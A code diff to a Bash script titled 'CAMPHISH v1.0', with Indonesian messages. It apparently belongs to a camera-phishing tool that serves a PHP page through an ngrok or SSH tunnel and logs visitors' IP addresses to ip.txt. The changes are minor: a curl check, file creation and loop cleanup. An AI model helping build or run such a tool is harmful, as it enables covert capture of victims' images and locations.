@@ -15,6 +15,7 @@ stop() {
 dependencies() {
     command -v php >/dev/null 2>&1 || { echo "[!] PHP belum terinstall!"; exit 1; }
     command -v ssh >/dev/null 2>&1 || { echo "[!] SSH belum terinstall!"; exit 1; }
+    command -v curl >/dev/null 2>&1 || { echo "[!] Curl belum terinstall!"; exit 1; }
 }
 
 banner() {
@@ -22,6 +23,10 @@ banner() {
     echo -e "\e[1;92m====================================\e[0m"
     echo -e "\e[1;93m        CAMPHISH v1.0 - Adrian      \e[0m"
     echo -e "\e[1;92m====================================\e[0m"
+}
+
+create_ip_file() {
+    [[ ! -f ip.txt ]] && touch ip.txt
 }
 
 start_php() {
@@ -49,9 +54,7 @@ start_ngrok() {
     echo "[*] Menunggu Ngrok URL..."
     while true; do
         link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
-        if [[ -n "$link" ]]; then
-            break
-        fi
+        [[ -n "$link" ]] && break
         sleep 2
     done
     echo "[+] Ngrok link: $link"
@@ -67,8 +70,10 @@ select_tunnel() {
     option="${option:-1}"
 }
 
+# Main
 banner
 dependencies
+create_ip_file
 start_php
 select_tunnel
 
